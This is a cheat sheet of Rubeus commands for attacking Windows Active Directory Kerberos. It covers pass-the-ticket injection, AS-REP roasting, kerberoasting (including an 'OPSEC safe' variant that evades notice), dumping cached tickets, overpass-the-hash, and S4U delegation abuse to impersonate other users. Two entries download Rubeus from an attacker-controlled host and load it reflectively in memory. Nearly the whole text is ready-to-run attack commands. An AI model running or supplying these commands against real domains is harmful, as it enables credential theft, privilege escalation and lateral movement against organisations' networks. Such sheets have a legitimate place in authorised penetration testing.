 % ad, windows, rubeus

# inject ticket from file
.\Rubeus.exe ptt /ticket:<ticket> 

# load rubeus from powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data); 

# execute rubeus from powershell
[Rubeus.Program]::MainString("klist"); 

# monitor
.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account> 

# inject ticket from b64 blob
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE> 

# check ASPREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file> 

# ASREPRoast specific user
.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file> 

# kerberoasting - current domain
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> 

# Kerberoasting and outputting on a file with a specific format
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> 

# Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec 

# Kerberoast AES enabled accounts
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes 
 
# Kerberoast specific user account
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple 

# get hash
.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password> 

# dump - will dump any relevant cached TGS ticket’s stored
.\Rubeus.exe dump 

# ask and inject ticket
.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt 

# S4U - with ticket - Constrained delegation
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt 

# S4U - with hash - Constrained delegation
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt 

# get rc4 of machine with the password
.\Rubeus.exe hash /password:<machine_password> 

# S4U - Resource based constrained delegation
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt 

# Rubeus Reflection assembly
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("<rubeus_cmd>".Split()) 

= ticket : c:\Temp\ticket.kirbi
= domain_fqdn : MYDC.mydomain.local
= domain_name : mydomain.local
= AS_REP_response_format : hashcat
